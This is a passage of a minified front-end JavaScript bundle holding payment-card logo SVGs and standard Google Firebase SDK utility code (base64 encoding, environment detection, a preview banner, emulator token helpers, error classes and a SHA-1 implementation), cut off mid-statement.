swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}');const FM="/assets/img-check-score-Dndu1lLp.png",xC="data:image/svg+xml,%3csvg%20width='56'%20height='35'%20viewBox='0%200%2056%2035'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cg%20clip-path='url(%23clip0_2_263)'%3e%3cpath%20d='M22.2249%209.53093L15.9407%2024.5243H11.8407L8.74823%2012.5589C8.56048%2011.8219%208.39723%2011.5519%207.82623%2011.2414C6.89399%2010.7357%205.35449%2010.2612%204%209.96667L4.092%209.53093H10.6917C11.533%209.53093%2012.2892%2010.0909%2012.4802%2011.0597L14.1134%2019.7356L18.1499%209.53068H22.2249V9.53093ZM38.2893%2019.6291C38.3058%2015.6719%2032.8173%2015.4539%2032.8551%2013.6862C32.8668%2013.1482%2033.3791%2012.5762%2034.5003%2012.4302C35.0561%2012.3574%2036.5873%2012.3019%2038.3241%2013.1012L39.0053%209.92167C38.0721%209.58293%2036.8713%209.25693%2035.3773%209.25693C31.5436%209.25693%2028.8456%2011.2949%2028.8229%2014.2132C28.7981%2016.3716%2030.7486%2017.5761%2032.2181%2018.2934C33.7298%2019.0279%2034.2371%2019.4999%2034.2313%2020.1569C34.2206%2021.1626%2033.0256%2021.6066%2031.9089%2021.6241C29.9594%2021.6541%2028.8281%2021.0966%2027.9264%2020.6774L27.2234%2023.9621C28.1296%2024.3778%2029.8024%2024.7406%2031.5366%2024.7588C35.6113%2024.7588%2038.2768%2022.7461%2038.2893%2019.6291ZM48.4128%2024.5243H52L48.8688%209.53093H45.5578C44.8133%209.53093%2044.1853%209.96442%2043.9073%2010.6309L38.0871%2024.5243H42.1598L42.9683%2022.2849H47.9445L48.4128%2024.5243ZM44.085%2019.2119L46.1265%2013.5824L47.3015%2019.2119H44.085ZM27.7666%209.53093L24.5594%2024.5243H20.6809L23.8894%209.53093H27.7666Z'%20fill='%231434CB'/%3e%3c/g%3e%3cdefs%3e%3cclipPath%20id='clip0_2_263'%3e%3crect%20width='48'%20height='15.5019'%20fill='white'%20transform='translate(4%209.25693)'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e",AC="data:image/svg+xml,%3csvg%20width='48'%20height='35'%20viewBox='0%200%2048%2035'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cg%20clip-path='url(%23clip0_2_264)'%3e%3cpath%20d='M28.9449%208.09448H19.0236V25.9213H28.9449V8.09448Z'%20fill='%23FF5F00'/%3e%3cpath%20d='M19.6536%2017.0079C19.6536%2013.5433%2021.2599%2010.2362%2023.9685%208.09448C19.0551%204.22046%2011.9055%205.07085%208.03152%2010.0157C4.189%2014.9291%205.03939%2022.0472%209.98427%2025.9212C14.1103%2029.1653%2019.874%2029.1653%2024%2025.9212C21.2599%2023.7795%2019.6536%2020.4724%2019.6536%2017.0079Z'%20fill='%23EB001B'/%3e%3cpath%20d='M42.3307%2017.0079C42.3307%2023.2756%2037.2598%2028.3464%2030.9921%2028.3464C28.4409%2028.3464%2025.9843%2027.4961%2024%2025.9212C28.9134%2022.0472%2029.7638%2014.9291%2025.8898%209.98424C25.3228%209.29133%2024.6929%208.62991%2024%208.09448C28.9134%204.22046%2036.063%205.07085%2039.9055%2010.0157C41.4803%2012%2042.3307%2014.4567%2042.3307%2017.0079Z'%20fill='%23F79E1B'/%3e%3c/g%3e%3cdefs%3e%3cclipPath%20id='clip0_2_264'%3e%3crect%20width='48'%20height='34.0158'%20fill='white'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e",EC="data:image/svg+xml,%3csvg%20width='39'%20height='35'%20viewBox='0%200%2039%2035'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cg%20clip-path='url(%23clip0_2_267)'%3e%3cpath%20d='M35.2959%2026.5473L33.5925%2024.6394L31.8209%2026.5473H20.8505V17.7574H17.3073L21.6682%207.87728H25.8928L27.3918%2011.2842V7.87728H32.6385L33.5243%2010.4666L34.4101%207.87728H38.4303V6.37822C38.4303%205.49242%2037.6808%204.74289%2036.795%204.74289H1.63533C0.749528%204.74289%200%205.49242%200%206.37822V27.6376C0%2028.5234%200.749528%2029.2729%201.63533%2029.2729H36.8631C37.7489%2029.2729%2038.4985%2028.5234%2038.4985%2027.6376V26.5473H35.2959Z'%20fill='%230071CE'/%3e%3cpath%20d='M35.7729%2025.5252H38.4984L34.8871%2021.6413L38.4984%2017.8937H35.841L33.5243%2020.3467L31.3439%2017.8937H28.5502L32.1615%2021.7095L28.5502%2025.5252H31.2076L33.5243%2023.0722L35.7729%2025.5252Z'%20fill='%230071CE'/%3e%3cpath%20d='M24.1212%2023.7536V22.5953H28.4139V20.8236H24.1212V19.6653H28.5502V17.8937H22.0089V25.5252H28.5502V23.7536H24.1212Z'%20fill='%230071CE'/%3e%3cpath%20d='M36.4543%2016.7353H38.4984V9.03564L35.2959%209.10378L33.5924%2013.8735L31.8208%209.10378H28.5502V16.7353H30.6625V11.3524L32.6385%2016.7353H34.4783L36.4543%2011.3524V16.7353Z'%20fill='%230071CE'/%3e%3cpath%20d='M25.1432%209.10379H22.4177L19.0107%2016.8035H21.3275L21.9407%2015.2363H25.4839L26.1653%2016.8035H28.5502L25.1432%209.10379ZM22.6902%2013.4647L23.7123%2010.9435L24.7344%2013.4647H22.6902Z'%20fill='%230071CE'/%3e%3cpath%20d='M36.5906%2021.4369L38.4985%2023.5492L38.5666%2019.3246L36.5906%2021.4369Z'%20fill='%230071CE'/%3e%3c/g%3e%3cdefs%3e%3cclipPath%20id='clip0_2_267'%3e%3crect%20width='38.5666'%20height='24.53'%20fill='white'%20transform='translate(0%204.74289)'/%3e%3c/clipPath%3e%3c/defs%3e%3c/svg%3e",TC="/assets/cc-logo-discover-DknAuQsy.svg",HM=()=>{};var zx={};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const CC={NODE_ADMIN:!1,SDK_VERSION:"${JSCORE_VERSION}"};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ye=function(t,e){if(!t)throw Oc(e)},Oc=function(t){return new Error("Firebase Database ("+CC.SDK_VERSION+") INTERNAL ASSERT FAILED: "+t)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const SC=function(t){const e=[];let n=0;for(let i=0;i<t.length;i++){let s=t.charCodeAt(i);s<128?e[n++]=s:s<2048?(e[n++]=s>>6|192,e[n++]=s&63|128):(s&64512)===55296&&i+1<t.length&&(t.charCodeAt(i+1)&64512)===56320?(s=65536+((s&1023)<<10)+(t.charCodeAt(++i)&1023),e[n++]=s>>18|240,e[n++]=s>>12&63|128,e[n++]=s>>6&63|128,e[n++]=s&63|128):(e[n++]=s>>12|224,e[n++]=s>>6&63|128,e[n++]=s&63|128)}return e},qM=function(t){const e=[];let n=0,i=0;for(;n<t.length;){const s=t[n++];if(s<128)e[i++]=String.fromCharCode(s);else if(s>191&&s<224){const o=t[n++];e[i++]=String.fromCharCode((s&31)<<6|o&63)}else if(s>239&&s<365){const o=t[n++],c=t[n++],d=t[n++],f=((s&7)<<18|(o&63)<<12|(c&63)<<6|d&63)-65536;e[i++]=String.fromCharCode(55296+(f>>10)),e[i++]=String.fromCharCode(56320+(f&1023))}else{const o=t[n++],c=t[n++];e[i++]=String.fromCharCode((s&15)<<12|(o&63)<<6|c&63)}}return e.join("")},Kv={byteToCharMap_:null,charToByteMap_:null,byteToCharMapWebSafe_:null,charToByteMapWebSafe_:null,ENCODED_VALS_BASE:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",get ENCODED_VALS(){return this.ENCODED_VALS_BASE+"+/="},get ENCODED_VALS_WEBSAFE(){return this.ENCODED_VALS_BASE+"-_."},HAS_NATIVE_SUPPORT:typeof atob=="function",encodeByteArray(t,e){if(!Array.isArray(t))throw Error("encodeByteArray takes an array as a parameter");this.init_();const n=e?this.byteToCharMapWebSafe_:this.byteToCharMap_,i=[];for(let s=0;s<t.length;s+=3){const o=t[s],c=s+1<t.length,d=c?t[s+1]:0,f=s+2<t.length,p=f?t[s+2]:0,v=o>>2,b=(o&3)<<4|d>>4;let w=(d&15)<<2|p>>6,E=p&63;f||(E=64,c||(w=64)),i.push(n[v],n[b],n[w],n[E])}return i.join("")},encodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?btoa(t):this.encodeByteArray(SC(t),e)},decodeString(t,e){return this.HAS_NATIVE_SUPPORT&&!e?atob(t):qM(this.decodeStringToByteArray(t,e))},decodeStringToByteArray(t,e){this.init_();const n=e?this.charToByteMapWebSafe_:this.charToByteMap_,i=[];for(let s=0;s<t.length;){const o=n[t.charAt(s++)],d=s<t.length?n[t.charAt(s)]:0;++s;const p=s<t.length?n[t.charAt(s)]:64;++s;const b=s<t.length?n[t.charAt(s)]:64;if(++s,o==null||d==null||p==null||b==null)throw new GM;const w=o<<2|d>>4;if(i.push(w),p!==64){const E=d<<4&240|p>>2;if(i.push(E),b!==64){const C=p<<6&192|b;i.push(C)}}}return i},init_(){if(!this.byteToCharMap_){this.byteToCharMap_={},this.charToByteMap_={},this.byteToCharMapWebSafe_={},this.charToByteMapWebSafe_={};for(let t=0;t<this.ENCODED_VALS.length;t++)this.byteToCharMap_[t]=this.ENCODED_VALS.charAt(t),this.charToByteMap_[this.byteToCharMap_[t]]=t,this.byteToCharMapWebSafe_[t]=this.ENCODED_VALS_WEBSAFE.charAt(t),this.charToByteMapWebSafe_[this.byteToCharMapWebSafe_[t]]=t,t>=this.ENCODED_VALS_BASE.length&&(this.charToByteMap_[this.ENCODED_VALS_WEBSAFE.charAt(t)]=t,this.charToByteMapWebSafe_[this.ENCODED_VALS.charAt(t)]=t)}}};class GM extends Error{constructor(){super(...arguments),this.name="DecodeBase64StringError"}}const NC=function(t){const e=SC(t);return Kv.encodeByteArray(e,!0)},um=function(t){return NC(t).replace(/\./g,"")},dm=function(t){try{return Kv.decodeString(t,!0)}catch(e){console.error("base64Decode failed: ",e)}return null};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function YM(t){return RC(void 0,t)}function RC(t,e){if(!(e instanceof Object))return e;switch(e.constructor){case Date:const n=e;return new Date(n.getTime());case Object:t===void 0&&(t={});break;case Array:t=[];break;default:return e}for(const n in e)!e.hasOwnProperty(n)||!QM(n)||(t[n]=RC(t[n],e[n]));return t}function QM(t){return t!=="__proto__"}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function KM(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("Unable to locate global object.")}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const WM=()=>KM().__FIREBASE_DEFAULTS__,$M=()=>{if(typeof process>"u"||typeof zx>"u")return;const t=zx.__FIREBASE_DEFAULTS__;if(t)return JSON.parse(t)},XM=()=>{if(typeof document>"u")return;let t;try{t=document.cookie.match(/__FIREBASE_DEFAULTS__=([^;]+)/)}catch{return}const e=t&&dm(t[1]);return e&&JSON.parse(e)},ep=()=>{try{return HM()||WM()||$M()||XM()}catch(t){console.info(`Unable to get __FIREBASE_DEFAULTS__ due to: ${t}`);return}},IC=t=>{var e,n;return(n=(e=ep())===null||e===void 0?void 0:e.emulatorHosts)===null||n===void 0?void 0:n[t]},kC=t=>{const e=IC(t);if(!e)return;const n=e.lastIndexOf(":");if(n<=0||n+1===e.length)throw new Error(`Invalid host ${e} with no separate hostname and port!`);const i=parseInt(e.substring(n+1),10);return e[0]==="["?[e.substring(1,n-1),i]:[e.substring(0,n),i]},DC=()=>{var t;return(t=ep())===null||t===void 0?void 0:t.config},MC=t=>{var e;return(e=ep())===null||e===void 0?void 0:e[`_${t}`]};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Hd{constructor(){this.reject=()=>{},this.resolve=()=>{},this.promise=new Promise((e,n)=>{this.resolve=e,this.reject=n})}wrapCallback(e){return(n,i)=>{n?this.reject(n):this.resolve(i),typeof e=="function"&&(this.promise.catch(()=>{}),e.length===1?e(n):e(n,i))}}}/**
 * @license
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function el(t){return t.endsWith(".cloudworkstations.dev")}async function Wv(t){return(await fetch(t,{credentials:"include"})).ok}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function OC(t,e){if(t.uid)throw new Error('The "uid" field is no longer supported by mockUserToken. Please use "sub" instead for Firebase Auth User ID.');const n={alg:"none",type:"JWT"},i=e||"demo-project",s=t.iat||0,o=t.sub||t.user_id;if(!o)throw new Error("mockUserToken must contain 'sub' or 'user_id' field!");const c=Object.assign({iss:`https://securetoken.google.com/${i}`,aud:i,iat:s,exp:s+3600,auth_time:s,sub:o,user_id:o,firebase:{sign_in_provider:"custom",identities:{}}},t);return[um(JSON.stringify(n)),um(JSON.stringify(c)),""].join(".")}const rd={};function ZM(){const t={prod:[],emulator:[]};for(const e of Object.keys(rd))rd[e]?t.emulator.push(e):t.prod.push(e);return t}function JM(t){let e=document.getElementById(t),n=!1;return e||(e=document.createElement("div"),e.setAttribute("id",t),n=!0),{created:n,element:e}}let Fx=!1;function $v(t,e){if(typeof window>"u"||typeof document>"u"||!el(window.location.host)||rd[t]===e||rd[t]||Fx)return;rd[t]=e;function n(w){return`__firebase__banner__${w}`}const i="__firebase__banner",o=ZM().prod.length>0;function c(){const w=document.getElementById(i);w&&w.remove()}function d(w){w.style.display="flex",w.style.background="#7faaf0",w.style.position="fixed",w.style.bottom="5px",w.style.left="5px",w.style.padding=".5em",w.style.borderRadius="5px",w.style.alignItems="center"}function f(w,E){w.setAttribute("width","24"),w.setAttribute("id",E),w.setAttribute("height","24"),w.setAttribute("viewBox","0 0 24 24"),w.setAttribute("fill","none"),w.style.marginLeft="-6px"}function p(){const w=document.createElement("span");return w.style.cursor="pointer",w.style.marginLeft="16px",w.style.fontSize="24px",w.innerHTML=" &times;",w.onclick=()=>{Fx=!0,c()},w}function v(w,E){w.setAttribute("id",E),w.innerText="Learn more",w.href="https://firebase.google.com/docs/studio/preview-apps#preview-backend",w.setAttribute("target","__blank"),w.style.paddingLeft="5px",w.style.textDecoration="underline"}function b(){const w=JM(i),E=n("text"),C=document.getElementById(E)||document.createElement("span"),M=n("learnmore"),V=document.getElementById(M)||document.createElement("a"),B=n("preprendIcon"),Y=document.getElementById(B)||document.createElementNS("http://www.w3.org/2000/svg","svg");if(w.created){const D=w.element;d(D),v(V,M);const Q=p();f(Y,B),D.append(Y,C,V,Q),document.body.appendChild(D)}o?(C.innerText="Preview backend disconnected.",Y.innerHTML=`<g clip-path="url(#clip0_6013_33858)">
<path d="M4.8 17.6L12 5.6L19.2 17.6H4.8ZM6.91667 16.4H17.0833L12 7.93333L6.91667 16.4ZM12 15.6C12.1667 15.6 12.3056 15.5444 12.4167 15.4333C12.5389 15.3111 12.6 15.1667 12.6 15C12.6 14.8333 12.5389 14.6944 12.4167 14.5833C12.3056 14.4611 12.1667 14.4 12 14.4C11.8333 14.4 11.6889 14.4611 11.5667 14.5833C11.4556 14.6944 11.4 14.8333 11.4 15C11.4 15.1667 11.4556 15.3111 11.5667 15.4333C11.6889 15.5444 11.8333 15.6 12 15.6ZM11.4 13.6H12.6V10.4H11.4V13.6Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6013_33858">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`):(Y.innerHTML=`<g clip-path="url(#clip0_6083_34804)">
<path d="M11.4 15.2H12.6V11.2H11.4V15.2ZM12 10C12.1667 10 12.3056 9.94444 12.4167 9.83333C12.5389 9.71111 12.6 9.56667 12.6 9.4C12.6 9.23333 12.5389 9.09444 12.4167 8.98333C12.3056 8.86111 12.1667 8.8 12 8.8C11.8333 8.8 11.6889 8.86111 11.5667 8.98333C11.4556 9.09444 11.4 9.23333 11.4 9.4C11.4 9.56667 11.4556 9.71111 11.5667 9.83333C11.6889 9.94444 11.8333 10 12 10ZM12 18.4C11.1222 18.4 10.2944 18.2333 9.51667 17.9C8.73889 17.5667 8.05556 17.1111 7.46667 16.5333C6.88889 15.9444 6.43333 15.2611 6.1 14.4833C5.76667 13.7056 5.6 12.8778 5.6 12C5.6 11.1111 5.76667 10.2833 6.1 9.51667C6.43333 8.73889 6.88889 8.06111 7.46667 7.48333C8.05556 6.89444 8.73889 6.43333 9.51667 6.1C10.2944 5.76667 11.1222 5.6 12 5.6C12.8889 5.6 13.7167 5.76667 14.4833 6.1C15.2611 6.43333 15.9389 6.89444 16.5167 7.48333C17.1056 8.06111 17.5667 8.73889 17.9 9.51667C18.2333 10.2833 18.4 11.1111 18.4 12C18.4 12.8778 18.2333 13.7056 17.9 14.4833C17.5667 15.2611 17.1056 15.9444 16.5167 16.5333C15.9389 17.1111 15.2611 17.5667 14.4833 17.9C13.7167 18.2333 12.8889 18.4 12 18.4ZM12 17.2C13.4444 17.2 14.6722 16.6944 15.6833 15.6833C16.6944 14.6722 17.2 13.4444 17.2 12C17.2 10.5556 16.6944 9.32778 15.6833 8.31667C14.6722 7.30555 13.4444 6.8 12 6.8C10.5556 6.8 9.32778 7.30555 8.31667 8.31667C7.30556 9.32778 6.8 10.5556 6.8 12C6.8 13.4444 7.30556 14.6722 8.31667 15.6833C9.32778 16.6944 10.5556 17.2 12 17.2Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6083_34804">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`,C.innerText="Preview backend running in this workspace."),C.setAttribute("id",E)}document.readyState==="loading"?window.addEventListener("DOMContentLoaded",b):b()}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Xn(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function Xv(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(Xn())}function eO(){var t;const e=(t=ep())===null||t===void 0?void 0:t.forceEnvironment;if(e==="node")return!0;if(e==="browser")return!1;try{return Object.prototype.toString.call(global.process)==="[object process]"}catch{return!1}}function tO(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function nO(){const t=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof t=="object"&&t.id!==void 0}function PC(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function iO(){const t=Xn();return t.indexOf("MSIE ")>=0||t.indexOf("Trident/")>=0}function rO(){return CC.NODE_ADMIN===!0}function sO(){return!eO()&&!!navigator.userAgent&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function aO(){try{return typeof indexedDB=="object"}catch{return!1}}function oO(){return new Promise((t,e)=>{try{let n=!0;const i="validate-browser-context-for-indexeddb-analytics-module",s=self.indexedDB.open(i);s.onsuccess=()=>{s.result.close(),n||self.indexedDB.deleteDatabase(i),t(!0)},s.onupgradeneeded=()=>{n=!1},s.onerror=()=>{var o;e(((o=s.error)===null||o===void 0?void 0:o.message)||"")}}catch(n){e(n)}})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const lO="FirebaseError";class Gs extends Error{constructor(e,n,i){super(n),this.code=e,this.customData=i,this.name=lO,Object.setPrototypeOf(this,Gs.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,qd.prototype.create)}}class qd{constructor(e,n,i){this.service=e,this.serviceName=n,this.errors=i}create(e,...n){const i=n[0]||{},s=`${this.service}/${e}`,o=this.errors[e],c=o?cO(o,i):"Error",d=`${this.serviceName}: ${c} (${s}).`;return new Gs(s,d,i)}}function cO(t,e){return t.replace(uO,(n,i)=>{const s=e[i];return s!=null?String(s):`<${i}?>`})}const uO=/\{\$([^}]+)}/g;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function yd(t){return JSON.parse(t)}function Nn(t){return JSON.stringify(t)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const jC=function(t){let e={},n={},i={},s="";try{const o=t.split(".");e=yd(dm(o[0])||""),n=yd(dm(o[1])||""),s=o[2],i=n.d||{},delete n.d}catch{}return{header:e,claims:n,data:i,signature:s}},dO=function(t){const e=jC(t),n=e.claims;return!!n&&typeof n=="object"&&n.hasOwnProperty("iat")},hO=function(t){const e=jC(t).claims;return typeof e=="object"&&e.admin===!0};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ns(t,e){return Object.prototype.hasOwnProperty.call(t,e)}function fc(t,e){if(Object.prototype.hasOwnProperty.call(t,e))return t[e]}function R0(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}function hm(t,e,n){const i={};for(const s in t)Object.prototype.hasOwnProperty.call(t,s)&&(i[s]=e.call(n,t[s],s,t));return i}function Ba(t,e){if(t===e)return!0;const n=Object.keys(t),i=Object.keys(e);for(const s of n){if(!i.includes(s))return!1;const o=t[s],c=e[s];if(Hx(o)&&Hx(c)){if(!Ba(o,c))return!1}else if(o!==c)return!1}for(const s of i)if(!n.includes(s))return!1;return!0}function Hx(t){return t!==null&&typeof t=="object"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Pc(t){const e=[];for(const[n,i]of Object.entries(t))Array.isArray(i)?i.forEach(s=>{e.push(encodeURIComponent(n)+"="+encodeURIComponent(s))}):e.push(encodeURIComponent(n)+"="+encodeURIComponent(i));return e.length?"&"+e.join("&"):""}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class fO{constructor(){this.chain_=[],this.buf_=[],this.W_=[],this.pad_=[],this.inbuf_=0,this.total_=0,this.blockSize=512/8,this.pad_[0]=128;for(let e=1;e<this.blockSize;++e)this.pad_[e]=0;this.reset()}reset(){this.chain_[0]=1732584193,this.chain_[1]=4023233417,this.chain_[2]=2562383102,this.chain_[3]=271733878,this.chain_[4]=3285377520,this.inbuf_=0,this.total_=0}compress_(e,n){n||(n=0);const i=this.W_;if(typeof e=="string")for(let b=0;b<16;b++)i[b]=e.charCodeAt(n)<<24|e.charCodeAt(n+1)<<16|e.charCodeAt(n+2)<<8|e.charCodeAt(n+3),n+=4;else for(let b=0;b<16;b++)i[b]=e[n]<<24|e[n+1]<<16|e[n+2]<<8|e[n+3],n+=4;for(let b=16;b<80;b++){const w=i[b-3]^i[b-8]^i[b-14]^i[b-16];i[b]=(w<<1|w>>>31)&4294967295}let s=this.chain_[0],o=this.chain_[1],c=this.chain_[2],d=this.chain_[3],f=this.chain_[4],p,v;for(let b=0;b<80;b++){b<40?b<20?(p=d^o&(c^d),v=1518500249):(p=o^c^d,v=1859775393):b<60?(p=o&c|d&(o|c),v=2400959708):(p=o^c^d,v=3395469782);const w=(s<<5|s>>>27)+p+f+v+i[b]&4294967295;f=d,d=c,c=(o<<30|o>>>2)&4294967295,o=s,s=w}this.chain_[0]=this.chain_[0]+s&4294967295,this.chain_[1]=this.chain_[1]+o&4294967295,this.chain_[2]=this.chain_[2]+c&4294967295,this.chain_[3]=this.chain_[3]+d&4294967295,this.chain_[4]=this.chain_[4]+f&4294967295}update(e,n){if(e==null)return;n===void 0&&(n=e.length);const i=n-this.blockSize;let s=0;const o=this.buf_;let 